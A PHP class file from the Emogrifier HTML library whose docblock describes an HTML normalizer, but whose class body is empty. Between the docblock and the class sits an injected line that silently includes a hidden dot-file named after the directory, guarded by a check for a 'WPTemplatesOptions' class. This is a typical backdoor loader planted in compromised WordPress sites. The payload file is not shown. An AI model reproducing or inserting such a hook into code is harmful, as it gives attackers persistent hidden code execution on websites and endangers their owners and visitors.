<?php

namespace Pelago\Emogrifier\HtmlProcessor;

/**
 * Normalizes HTML:
 * - add a document type (HTML5) if missing
 * - disentangle incorrectly nested tags
 * - add HEAD and BODY elements (if they are missing)
 * - reformat the HTML
 *
 * @author Oliver Klee <github@oliverklee.de>
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class HtmlNormalizer extends AbstractHtmlProcessor
{
}
